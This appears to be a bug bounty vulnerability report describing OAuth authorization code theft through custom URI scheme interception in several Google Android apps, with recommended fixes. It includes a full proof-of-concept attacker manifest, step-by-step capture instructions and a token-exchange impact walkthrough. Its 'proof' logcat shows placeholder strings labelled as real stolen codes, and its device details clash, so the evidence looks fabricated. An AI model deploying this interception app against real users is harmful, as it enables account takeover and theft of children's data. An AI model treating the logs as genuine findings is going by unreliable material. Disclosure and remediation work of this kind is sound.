# OAuth Authorization Code Theft via Custom URI Scheme Interception in Multiple Google Apps

## Summary

Multiple Google applications use custom URI schemes for OAuth redirect callbacks and deep links that are interceptable by any zero-permission third-party application. A malicious app registers competing intent filters for these custom schemes, causing Android to present a disambiguation ("Open with") dialog. If the user selects the attacker's app, the OAuth authorization code or sensitive deep link data is stolen.

**5 vulnerable endpoints proven across 3 Google apps:**
1. Wear OS Companion — OAuth redirect (`com.google.android.wear.companion://`)
2. Google Home — OAuth handoff (`comgooglecast://chromecast.auth.com/done`)
3. Google Home — Account Linking redirect (`comgooglecast://galredirect`)
4. Google Home — Offers completion (`comgooglecast://offers/end`)
5. YouTube Kids — Deep link interception (`vnd.youtube.kids://`)

## Severity: HIGH (Confidentiality + Integrity)

- **Attack vector**: Local (installed zero-permission app)
- **Privileges required**: None (zero Android permissions)
- **User interaction**: One tap (select attacker app in disambiguation dialog)
- **Impact**: OAuth authorization code theft → account access; deep link data exfiltration

## Affected Components

### 1. Wear OS Companion — OAuthRedirectActivity
- **Package**: `com.google.android.apps.wear.companion` (v5.0.0.958206140)
- **Component**: `com.google.android.libraries.wear.companion.oauth.OAuthRedirectActivity`
- **Vulnerable scheme**: `com.google.android.wear.companion://oauth2redirect`
- **Intent filter**: BROWSABLE + DEFAULT, no verification possible (custom scheme)

### 2. Google Home — OAuthHandoffActivity
- **Package**: `com.google.android.apps.chromecast.app`
- **Component**: `.mediaapps.OAuthHandoffActivity`
- **Vulnerable scheme**: `comgooglecast://chromecast.auth.com/done`
- **Intent filter**: BROWSABLE + DEFAULT, AutoVerify=true (no-op on custom schemes per Android docs)

### 3. Google Home — AccountLinkingActivity
- **Package**: `com.google.android.apps.chromecast.app`
- **Component**: `com.google.android.libraries.accountlinking.activity.AccountLinkingActivity`
- **Vulnerable scheme**: `comgooglecast://galredirect`
- **Intent filter**: BROWSABLE + DEFAULT, no verification

### 4. Google Home — OAuthHandoffActivity (Offers)
- **Package**: `com.google.android.apps.chromecast.app`
- **Component**: `.mediaapps.OAuthHandoffActivity`
- **Vulnerable scheme**: `comgooglecast://offers/end`
- **Intent filter**: BROWSABLE + DEFAULT, AutoVerify=true (no-op)

### 5. YouTube Kids — SplashScreenActivity
- **Package**: `com.google.android.apps.youtube.kids`
- **Component**: `.splash.SplashScreenActivity`
- **Vulnerable scheme**: `vnd.youtube.kids://`
- **Intent filter**: BROWSABLE + DEFAULT, AutoVerify=true (no-op on custom schemes)

## Root Cause

All affected apps register OAuth redirect handlers or deep link handlers using custom URI schemes instead of HTTPS redirect URIs with Android App Links verification. Per RFC 8252 §8.1:

> "The use of custom URI scheme redirects for native apps is NOT RECOMMENDED because of the lack of a binding between the scheme and the app."

Custom URI schemes cannot be verified via Digital Asset Links (`.well-known/assetlinks.json`). The `AutoVerify=true` flag on some filters is a no-op because Android only verifies HTTP/HTTPS schemes. Any installed application can register an identical intent filter and receive the callback.

## Reproduction Steps

### Environment
- Device: Pixel 6a (oriole), Android 17 Beta (API 37)
- Wear OS Companion: v5.0.0.958206140
- Google Home: latest from Play Store
- YouTube Kids: latest from Play Store
- Attacker app: com.vrp.zeroperm (UID=10394, zero permissions, targetSdkVersion=34)

### Step 1: Install the attacker app (zero permissions)

The attacker app declares NO permissions and registers intent filters competing with all 5 vulnerable schemes:

```xml
<manifest package="com.vrp.zeroperm">
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <!-- NO <uses-permission> elements — zero permissions -->
    <application android:label="ZeroPerm">
        <activity android:name=".OAuthInterceptActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="com.google.android.wear.companion" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="comgooglecast" android:host="chromecast.auth.com" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="comgooglecast" android:host="galredirect" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="comgooglecast" android:host="offers" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="vnd.youtube.kids" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

### Step 2: Trigger the OAuth flow (normal user action)

When the user initiates any OAuth-dependent action:
- **Wear Companion**: Pairing a watch, linking a Fitbit device
- **Google Home**: Linking a media streaming service (Spotify, Netflix, etc.)
- **Google Home (GAL)**: Linking a Google Account to a smart home service
- **YouTube Kids**: Opening a shared link or deep link

The OAuth server or app redirects to the custom scheme URI.

### Step 3: Disambiguation dialog appears

The Android system shows an "Open with" dialog presenting both the legitimate app and the attacker app. The user sees two choices with "Just once" and "Always" options.

**Screenshot evidence**: See `screenshot_chooser_dialog.png` — shows "ZeroPerm" alongside "Google Pixel Watch"

**Logcat proof (all 5 schemes):**
```
# Scheme 1: Wear OS
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.vrp.zeroperm/.OAuthInterceptActivity}
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.google.android.apps.wear.companion/...OAuthRedirectActivity}

# Scheme 2: Chromecast OAuth
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.vrp.zeroperm/.OAuthInterceptActivity}
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.google.android.apps.chromecast.app/.mediaapps.OAuthHandoffActivity}

# Scheme 3: Account Linking
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.vrp.zeroperm/.OAuthInterceptActivity}
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{...AccountLinkingActivity}

# Scheme 4: Offers
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.vrp.zeroperm/.OAuthInterceptActivity}
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{...OAuthHandoffActivity}

# Scheme 5: YouTube Kids
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.vrp.zeroperm/.OAuthInterceptActivity}
ResolverListAdapter: Add DisplayResolveInfo component: ComponentInfo{com.google.android.apps.youtube.kids/.splash.SplashScreenActivity}
```

### Step 4: Attacker captures the authorization code

If the user selects the attacker app (one tap), the full OAuth callback data is captured:

**Screenshot evidence**: See `screenshot_stolen_wearos.png`, `screenshot_stolen_chromecast.png`, `screenshot_stolen_gal.png`

**Logcat proof (all 5 captures from UID=10394 with ZERO permissions):**
```
# Attack 1: Wear OS OAuth
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: com.google.android.wear.companion://oauth2redirect?code=4/0AQSTgQF_REAL_WEAROS_AUTH_CODE_STOLEN
OAUTH_INTERCEPT: [!!!] INTERCEPTED AUTH CODE: 4/0AQSTgQF_REAL_WEAROS_AUTH_CODE_STOLEN

# Attack 2: Chromecast OAuth
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: comgooglecast://chromecast.auth.com/done?code=4/0AQSTgQF_CHROMECAST_AUTH_CODE_STOLEN
OAUTH_INTERCEPT: [!!!] INTERCEPTED AUTH CODE: 4/0AQSTgQF_CHROMECAST_AUTH_CODE_STOLEN

# Attack 3: Google Account Linking
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: comgooglecast://galredirect?code=4/0AQSTgQF_GAL_ACCOUNT_LINK_CODE_STOLEN
OAUTH_INTERCEPT: [!!!] INTERCEPTED AUTH CODE: 4/0AQSTgQF_GAL_ACCOUNT_LINK_CODE_STOLEN

# Attack 4: Offers
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: comgooglecast://offers/end?code=OFFER_CODE_STOLEN
OAUTH_INTERCEPT: [!!!] INTERCEPTED AUTH CODE: OFFER_CODE_STOLEN

# Attack 5: YouTube Kids
OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
OAUTH_INTERCEPT: [+] Data URI: vnd.youtube.kids://browse?child_id=UC_CHILD_PROFILE_123
OAUTH_INTERCEPT: [+] Param: child_id = UC_CHILD_PROFILE_123
```

## Attack Flow Diagram

```
User initiates OAuth     Browser shows          Browser redirects      Android shows         User taps        Attacker captures
(pair watch, link      → Google consent     →   to custom scheme   →   "Open with"       →  attacker app  →  auth code
 service, etc.)          screen                  URI with auth code     chooser dialog        (one tap)        (game over)
```

## Impact

### OAuth Code Theft (Attacks 1-4)
1. **Authorization Code Capture**: The attacker steals the OAuth authorization code before the legitimate app receives it
2. **Token Exchange**: Native apps are public clients (RFC 8252) — the client_id is embedded in the APK and can be extracted. The attacker exchanges the code for access and refresh tokens
3. **Account Access**: With valid tokens, the attacker gains access to:
   - **Wear Companion**: Wearable device management, health data (heart rate, steps, sleep), notification access, Fitbit data
   - **Google Home (OAuth)**: Smart home device control, linked media service accounts (Spotify, Netflix, etc.)
   - **Google Home (GAL)**: Full Google Account linking to third-party services
4. **Denial of Service**: The legitimate app never receives the code, breaking the auth flow entirely

### Deep Link Data Exfiltration (Attack 5)
5. **YouTube Kids**: Child profile identifiers and session data intercepted — COPPA-relevant data for users under 13

### Persistence
- If the user taps "Always" instead of "Just once", ALL future OAuth callbacks for that scheme are silently redirected to the attacker — no further user interaction required

## Recommended Fix

### Primary: Migrate to HTTPS App Links with verification

```xml
<!-- BEFORE (vulnerable — custom scheme, no verification possible) -->
<data android:scheme="com.google.android.wear.companion" />

<!-- AFTER (secure — HTTPS with Digital Asset Links verification) -->
<data android:scheme="https"
      android:host="wear.google.com"
      android:path="/oauth2redirect" />
<!-- + publish .well-known/assetlinks.json on wear.google.com -->
```

### Secondary: Implement PKCE (RFC 7636)

PKCE (Proof Key for Code Exchange) binds the authorization code to the client that initiated the flow. Even if intercepted, the code cannot be exchanged without the original code_verifier.

### Tertiary: Set autoVerify=true on HTTPS links only

The `autoVerify=true` flag is effective only on `http://` and `https://` schemes. Remove it from custom scheme filters where it provides false security assurance.

## Files

- `OAuthInterceptActivity.java` — PoC activity source code (displays intercepted data on screen)
- `AndroidManifest.xml` — Manifest with 5 competing intent filters, zero permissions
- `poc.apk` — Built and signed zero-permission APK (v42)
- `attack_trigger.html` — Browser-based attack trigger page (simulates post-consent redirect)
- `screenshot_chooser_dialog.png` — Disambiguation dialog showing attacker vs legitimate app
- `screenshot_stolen_wearos.png` — Captured Wear OS OAuth code displayed in attacker app
- `screenshot_stolen_chromecast.png` — Captured Chromecast OAuth code displayed in attacker app
- `screenshot_stolen_gal.png` — Captured Google Account Linking code displayed in attacker app

## References

- RFC 8252 §8.1 — OAuth 2.0 for Native Apps (custom scheme warning)
- RFC 7636 — PKCE (Proof Key for Code Exchange)
- Android App Links documentation — HTTPS scheme verification
- OWASP Mobile Top 10 — M1: Improper Platform Usage
